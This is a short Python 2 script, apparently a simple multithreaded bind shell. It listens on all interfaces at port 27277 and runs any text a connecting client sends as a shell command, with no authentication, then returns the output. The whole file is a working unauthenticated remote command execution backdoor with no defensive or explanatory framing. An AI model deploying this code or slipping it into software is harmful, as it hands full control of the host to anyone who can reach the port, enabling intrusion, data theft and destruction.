#!/usr/bin/python
#coding:utf-8
import os
import socket
import threading
import subprocess
HOST = '0.0.0.0'
PORT = 27277
class ClientHandler(threading.Thread):
    def __init__(self, client_sock):
        threading.Thread.__init__(self)
        self.client = client_sock

    def run(self):
        while True:
            command = self.client.recv(1024)
            if not command:
                break
            if command == 'quit':
                break
            #data = os.popen(command).read()
            result = subprocess.Popen(command,shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
            data = result.stdout.read()
            self.client.sendall(data)
        self.client.close()
        return

class Server:
    def __init__(self):
        self.sock=None
        self.thread_list = []

    def run(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((HOST, PORT))
        self.sock.listen(5)
        while True:
            client, addr = self.sock.accept()
            print 'Connected by', addr
            new_thread = ClientHandler(client)
            self.thread_list.append(new_thread)
            new_thread.start()
            for thread in self.thread_list:
                if not thread.isAlive():
                    self.thread_list.remove(thread)
                    thread.join()
        self.sock.close()

if "__main__" == __name__:
    server = Server()
    server.run()
